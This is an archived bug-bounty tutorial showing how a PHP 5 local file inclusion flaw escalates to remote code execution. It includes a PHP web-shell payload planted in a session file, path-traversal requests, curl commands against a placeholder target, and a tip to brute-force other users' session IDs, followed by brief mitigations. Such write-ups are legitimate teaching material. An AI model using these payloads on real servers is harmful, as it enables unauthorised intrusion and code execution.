# From LFI to RCE via PHP Sessions (PHP 5) — A Complete Guide with Real Examples

- **Source URL:** https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-sessions-php-5-a-complete-guide-with-real-examples-6ced00a1ae10?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905175044/https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-sessions-php-5-a-complete-guide-with-real-examples-6ced00a1ae10?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10108 (id 10108)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💥 From LFI to RCE via PHP Sessions (PHP 5) — A Complete Guide with Real Examples 🧠💻

By

*Local File Inclusion (LFI) vulnerabilities are often underestimated, but when combined with PHP session files, they can be escalated into full Remote Code Execution (RCE). This is especially true in legacy applications running PHP 5, where session handling is less secure. 💥🧠💻*

*In this complete guide, we’ll explore how attackers abuse PHP session files to execute arbitrary code, turning a simple inclusion bug into a critical exploit chain.*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

*If you’re exploring Local File Inclusion (LFI) and wondering how attackers escalate it into Remote Code Execution (RCE) — one underrated method is exploiting PHP session files, especially in PHP 5. This guide shows how LFI can become RCE through PHP session hijacking, with full technical breakdowns and examples.*


## 🔍 What Are PHP Sessions?

PHP uses sessions to store temporary data (e.g. login tokens) for users. These are stored on the server — usually in files.

## 🗂️ Default Session Storage Path (PHP 5):

`/var/lib/php5/sess_<SESSION_ID>`
Each session file contains serialized PHP data, like this:

`username|s:5:"admin";`
The filename is based on the `PHPSESSID` cookie. So if your cookie is:

`PHPSESSID=abcd1234`
Then the session file will be:

`/var/lib/php5/sess_abcd1234`
## 🕳️ LFI + Sessions = RCE

If you can inject PHP code into your session file and then include that file using LFI, PHP will **parse and execute it**, leading to RCE.

## 🛠️ Step-by-Step Attack

## ✅ Step 1: Find LFI

Test the vulnerable endpoint:

`https://target.com/index.php?page=../../../../etc/passwd`
If this returns system content, LFI is confirmed.

## ✅ Step 2: Set Malicious PHPSESSID

Use a predictable or forced session ID (e.g. via Burp Suite or curl):

`Cookie: PHPSESSID=evil123`
## ✅ Step 3: Inject PHP Code Into Session

Make a request that stores your PHP code into the session. Example (via POST or GET):

`https://target.com/login.php?username=<?php system($_GET['cmd']); ?>`
This stores raw PHP into the session file:

`username|s:29:"<?php system($_GET['cmd']); ?>";`
## ✅ Step 4: Include the Session File via LFI

Access the session file through the LFI endpoint:

`https://target.com/index.php?page=../../../../var/lib/php5/sess_evil123&cmd=id`
## 🧪 Expected Output:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
Boom! RCE achieved. 💥

## 🧪 Testing with curl

Inject code:

`curl -b "PHPSESSID=evil123" "https://target.com/login.php?username=<?php system($_GET['cmd']); ?>"`
Trigger LFI:

`curl "https://target.com/index.php?page=../../../../var/lib/php5/sess_evil123&cmd=whoami"`
## 🛡️ Mitigation Strategies

## 🚫 Never include raw input:

```
// Bad
include($_GET['page']);
```
## ✅ Use a whitelist:

```
$pages = ['home' => 'home.php', 'about' => 'about.php'];
if (in_array($_GET['page'], array_keys($pages))) {
  include($pages[$_GET['page']]);
}
```
## 🔐 Secure Session Storage

- Move session files out of webroot
- Use custom session handlers or database-based sessions
- Disable session file parsing by PHP

## 🔧 Harden PHP

- `allow_url_include = Off`
- `allow_url_fopen = Off`
- `open_basedir` restrictions

## 📌 Final Tips for Pentesters

✅ Session file locations may vary across distributions:

- Debian/Ubuntu PHP5: `/var/lib/php5/`
- CentOS/RHEL PHP5: `/var/lib/php/session/`

✅ Try guessing other users’ sessions or brute-forcing session IDs if predictable.

✅ Works best in PHP \<= 5.6 with `mod_php` where session files are parsed.

*With just a session injection and LFI, you can gain full code execution — this is one of the stealthiest and most powerful LFI-to-RCE paths.*
